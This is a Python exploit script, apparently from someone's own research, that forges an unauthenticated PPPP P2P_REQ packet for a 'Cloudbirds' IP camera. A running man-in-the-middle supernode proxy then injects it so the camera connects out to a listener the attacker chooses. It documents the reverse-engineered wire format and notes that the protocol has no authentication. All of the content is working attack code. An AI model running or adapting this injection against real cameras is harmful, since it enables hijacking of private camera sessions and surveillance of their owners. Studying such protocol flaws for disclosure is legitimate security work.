#!/usr/bin/env python3
"""
Build a P2P_REQ injection packet for the Cloudbirds cam.

Wire format determined from disassembling cs2p2p_PPPP_Proto_Send_P2PReq and
Proto_Write_P2PReq in libPPCS_API.so:

  F1 20 00 24                            4-byte header (type=0x20, len=36)
  <prefix[7]> 00                         bytes [4..12]  peer DID prefix
  <lgn_u32_BE>                           bytes [12..16] peer session/login id
  <suffix[7]> 00                         bytes [16..24] peer DID suffix
  <sockaddr_in: family BE + port BE + ipv4 BE + 8B zero>  bytes [24..40]

Total: 40 bytes on wire. Body has zero auth/nonce/CRC fields; the cam's
acceptance is purely based on the incoming UDP 4-tuple matching its
current supernode session.

Usage:
  python3 inject_p2p_req.py --peer-ip 192.168.5.233 --peer-port 41234 \\
    --cam-session 192.168.5.1:12301

  This writes /tmp/cam-listen/inject.json then sends SIGUSR1 to the
  running mitm_supernode_proxy.py so it emits the packet from its
  :32100 socket.
"""
from __future__ import annotations

import argparse
import json
import os
import signal
import socket
import struct
import subprocess
import time
from pathlib import Path

INJECT_FILE = Path("/tmp/cam-listen/inject.json")


def pad7(s: str) -> bytes:
    """Encode a string as the 8-byte field Write_P2PReq uses (strncpy 7 + pad)."""
    b = s.encode("ascii", errors="replace")[:7]
    return b + b"\x00" * (8 - len(b))


def build_p2p_req(
    did_prefix: str,
    lgn: int,
    did_suffix: str,
    peer_ip: str,
    peer_port: int,
) -> bytes:
    header = struct.pack(">BBH", 0xF1, 0x20, 36)
    body = (
        pad7(did_prefix)                          # 8 bytes (bytes 0-8)
        + struct.pack(">I", lgn & 0xFFFFFFFF)     # 4 bytes (bytes 8-12)
        + pad7(did_suffix)                        # 8 bytes (bytes 12-20)
        + struct.pack(">HH", 2, peer_port)        # family + port (4 bytes, 20-24)
        + socket.inet_aton(peer_ip)               # ipv4 (4 bytes, 24-28)
        + b"\x00" * 8                             # sockaddr padding (28-36)
    )
    assert len(body) == 36, f"body is {len(body)} B, expected 36"
    packet = header + body
    assert len(packet) == 40, f"packet is {len(packet)} B, expected 40"
    return packet


def find_proxy_pid() -> int | None:
    try:
        out = subprocess.check_output(["pgrep", "-f", "mitm_supernode_proxy.py"])
        for line in out.decode().split():
            if line.strip():
                return int(line.strip())
    except subprocess.CalledProcessError:
        pass
    return None


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--peer-ip", default="192.168.5.233", help="Where the cam should punch to (our listener)")
    p.add_argument("--peer-port", type=int, default=41234, help="Port we want cam to punch to")
    p.add_argument("--did-prefix", default="APPID", help="Synthetic peer DID prefix (max 7 chars)")
    p.add_argument("--did-suffix", default="XXXXX", help="Synthetic peer DID suffix (max 7 chars)")
    p.add_argument("--lgn", type=int, default=1, help="Session/login id (u32)")
    p.add_argument("--cam-session", default="192.168.5.1:12301",
                   help="Cam's MASQ'd session endpoint (from mitm_supernode.log)")
    p.add_argument("--repeat", type=int, default=1, help="How many sessions to target simultaneously")
    args = p.parse_args()

    # Allow cam-session to be a comma-separated list of sessions
    targets_ip_port = [t.strip() for t in args.cam_session.split(",") if t.strip()]

    packet = build_p2p_req(
        did_prefix=args.did_prefix,
        lgn=args.lgn,
        did_suffix=args.did_suffix,
        peer_ip=args.peer_ip,
        peer_port=args.peer_port,
    )
    print(f"built {len(packet)}B packet: {packet.hex()}")
    print(f"  → header = {packet[:4].hex()}")
    print(f"  → body   = {packet[4:].hex()}")

    spec = [
        {"target": t, "hex": packet.hex()}
        for t in targets_ip_port
        for _ in range(args.repeat)
    ]
    INJECT_FILE.parent.mkdir(parents=True, exist_ok=True)
    INJECT_FILE.write_text(json.dumps(spec, indent=2))
    print(f"wrote {len(spec)} injection targets → {INJECT_FILE}")

    pid = find_proxy_pid()
    if pid is None:
        print("⚠ mitm_supernode_proxy.py not running — start it first")
        return 2
    print(f"sending SIGUSR1 to proxy pid={pid}")
    os.kill(pid, signal.SIGUSR1)
    print("done — watch /tmp/cam-listen/mitm_supernode.log and your peer listener")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
